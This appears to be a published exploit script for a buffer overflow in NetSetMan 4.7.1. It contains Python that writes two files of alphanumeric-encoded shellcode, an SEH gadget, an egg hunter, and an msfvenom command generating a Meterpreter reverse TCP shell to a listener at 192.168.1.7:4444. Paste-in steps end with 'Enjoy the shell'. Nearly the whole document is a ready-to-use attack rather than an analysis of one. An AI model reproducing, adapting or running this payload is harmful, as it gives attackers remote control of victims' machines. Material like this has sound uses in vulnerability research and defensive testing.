# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in NetSetMan 4.7.1

#SEH record (nseh field) at 0x05b4fd24 overwritten with unicode pattern : 0x00410034 (offset 74), followed by 362 bytes of cyclic data after the handler
#   0x00750051 : pop ecx # pop ebp # ret  | startnull,unicode,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [netsetman.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.7.1.0 (C:\Program Files\NetSetMan\netsetman.exe)
# shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 EXITFUNC=seh BufferRegister=EDI -e x86/alpha_mixed 
# Egg hunter: \x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7
# Command to encode egg hunter: ./alpha2 eax --unicode --uppercase < egg.bin

# Steps to execute this exploit:
# 1. Execute Python script
# 2. Setup metasploit
# 3. Open NetSetMan
# 4. Go to SET1 Tab > Enable Workgorup > Paste the text from set_payload.txt in this field
# 5. Go to Double Click Tab > Enable Workgorup > Paste the text from dc_payload.txt in this field
# 6. Enjoy the shell

filename1 = "dc_paload.txt"
filename2 = "set_payload.txt"

dcString = "\x68" * 76 + "\x51\x75" + "\x55\x65\x58\x65\x05\x07\x11\x65\x2D\x01\x11\x65" + "\x71" * 94 + "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBS6SQHJKOLOQ20RBJKR0X8MNNOLKUPZ3DJOFXBYBCT3RCTKJZ6OCE9ZVOT59WKO9WA"
setString = "ycscycsc" + "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIilXhnbePgpGpqpLIYueaYPSTNkRpTpNkF2DLLK62DTlKsBgX6ox73z16ua9ollelPasLvbDla0JaXOvms1yWm2l2cbsgLKRrB0nkrjElLK0LdQbXHc78UQ8QSaLKsi5p6akcLKG9uHhc7J3ylKfTnkVaxVP1YoNLKqhOdMUQYWDxip45kFWssMXx5k1ma4bUItshlK1H4dS1hSsVNkDLRklKBxuLGqZsLKS4NkUQN0niw4UtVDCkskqq0YbzV1kOYp3oQO1JnkWb8klMaMcXgCTrc030CXqgRSfRSopTBH2l3GWVGwLIHhIohPX8Z0wqGpePTixDSdv0586Ik0pk7p9on5PjfjbHIPY8c137PhDB30fqClLIjFBpPP60rpqPRpQP60PhXj6o9OKPyoJuJ7sZR0v63gbHOinE44qqkOKeNeyPcDdJ9oRnEXqejLHhe7wpC0gp2JEPQzfdcfrw1xVbII8HsoioYEMSZXePanEfnkufqzg0cXePDP5PUP1FQzEP0hchOTrsYuKOJuJ3rsPj5PPV2s2wRHgryIHHQOioN5LCJXc0CMvHBxcXUPspePs02JuPF0E84KFOfo6PioYESgPh2URNrme1YoKeaNQNYotLa4voNeppyoKOiokYmKyokOyoFa9SdihF2UYQXCOKYnTNwBJJRJS0v3KOZusZgpISAA"

file = open(filename1,'w')
file.write(dcString)
file.close()

file = open(filename2,'w')
file.write(setString)
file.close()
